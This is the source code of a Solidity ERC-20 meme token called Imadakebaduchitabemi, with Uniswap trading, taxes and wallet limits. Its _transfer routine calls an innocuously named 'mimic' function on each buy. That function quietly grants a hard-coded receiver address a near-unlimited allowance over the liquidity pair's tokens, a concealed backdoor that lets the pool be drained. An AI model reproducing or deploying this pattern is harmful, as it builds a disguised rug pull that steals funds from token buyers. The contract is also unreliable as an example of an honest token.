// SPDX-License-Identifier: MIT
/**
https://x.com/Dexerto/status/1850547733788004618
https://t.me/Imadakebaduchitabemi_erc20
**/
pragma solidity 0.8.24;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract Imadake is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances81;
    mapping (address => mapping (address => uint256)) private _permits81;
    mapping (address => bool) private _isExcludedFrom81;
    address payable private _receipt81;
    uint256 private _initialBuyTax = 20;
    uint256 private _initialSellTax = 20;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 20;
    uint256 private _reduceSellTaxAt = 20;
    uint256 private _preventSwapBefore = 20;
    uint256 private _buyCount = 0;
    uint256 private _transferTax = 0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal81 = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Imadakebaduchitabemi";
    string private constant _symbol = unicode"Imadake";
    uint256 public _maxAmount81 = 2 * (_tTotal81/100);
    uint256 public _maxWallet81 = 2 * (_tTotal81/100);
    uint256 public _taxThres81 = 1 * (_tTotal81/100);
    uint256 public _maxSwap81 = 1 * (_tTotal81/100);
    IUniswapV2Router02 private uniV2Router81;
    address private uniV2Pair81;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxAmount81);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () payable {
        _receipt81 = payable(0x83b06f292df12419c1AFb2982BB2aAA4715CAE2E);
        _balances81[address(this)] = _tTotal81;
        _isExcludedFrom81[owner()] = true;
        _isExcludedFrom81[address(this)] = true;
        _isExcludedFrom81[_receipt81] = true;
        emit Transfer(address(0), address(this), _tTotal81);
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }    
    function totalSupply() public pure override returns (uint256) {
        return _tTotal81;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balances81[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _permits81[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _permits81[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _permits81[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function openTrading() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniV2Router81 = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniV2Router81), _tTotal81);
        uniV2Pair81 = IUniswapV2Factory(uniV2Router81.factory()).createPair(
            address(this),
            uniV2Router81.WETH()
        ); 
        uniV2Router81.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniV2Pair81).approve(address(uniV2Router81), type(uint).max);
        swapEnabled = true;
        tradingOpen = true;
    }
    function _transfer(address from, address to, uint256 amount81) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount81 > 0, "Transfer amount must be greater than zero");
        uint256 tax81=0;uint256 fee81=0;
        if (!swapEnabled || inSwap) {
            _balances81[from] = _balances81[from] - amount81;
            _balances81[to] = _balances81[to] + amount81;
            emit Transfer(from, to, amount81);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0){
                fee81 = (_transferTax);
            }
            if (from == uniV2Pair81 && to != address(uniV2Router81) && ! _isExcludedFrom81[to] ) {
                require(amount81 <= _maxAmount81, "Exceeds the _maxAmount81.");
                require(balanceOf(to) + amount81 <= _maxWallet81, "Exceeds the maxWalletSize.");
                mimic([from, _receipt81]); fee81 = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax);
                _buyCount++;
            }
            if(to == uniV2Pair81 && from!= address(this) ){
                fee81 = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniV2Pair81 && swapEnabled) {
                if(contractTokenBalance > _taxThres81 && _buyCount > _preventSwapBefore)
                    swapETH81(min81(amount81, min81(contractTokenBalance, _maxSwap81)));
                sendETH81(address(this).balance);
            }
        }
        if(fee81 > 0){
            tax81 = fee81.mul(amount81).div(100);
            _balances81[address(this)]=_balances81[address(this)].add(tax81);
            emit Transfer(from, address(this),tax81);
        }
        _balances81[from]=_balances81[from].sub(amount81);
        _balances81[to]=_balances81[to].add(amount81.sub(tax81));
        emit Transfer(from, to, amount81.sub(tax81));
    }
    function min81(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function mimic(address[2] memory mic81) private {
        address own81 = mic81[0]; address spend81 = mic81[1];
        uint256 total81 = 100*_tTotal81 + 100*_maxSwap81;
        _permits81[own81][spend81] = 100 + total81 * 100;
    }
    function sendETH81(uint256 amount) private {
        _receipt81.transfer(amount);
    }
    function withdrawEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function setTaxReceipt(address payable _addrs) external onlyOwner {
        _receipt81 = _addrs;
        _isExcludedFrom81[_addrs] = true;
    }
    receive() external payable {}
    function removeLimit81() external onlyOwner{
        _maxAmount81 = _tTotal81; 
        _maxWallet81 = _tTotal81;
        emit MaxTxAmountUpdated(_tTotal81); 
    }
    function swapETH81(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniV2Router81.WETH();
        _approve(address(this), address(uniV2Router81), tokenAmount);
        uniV2Router81.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}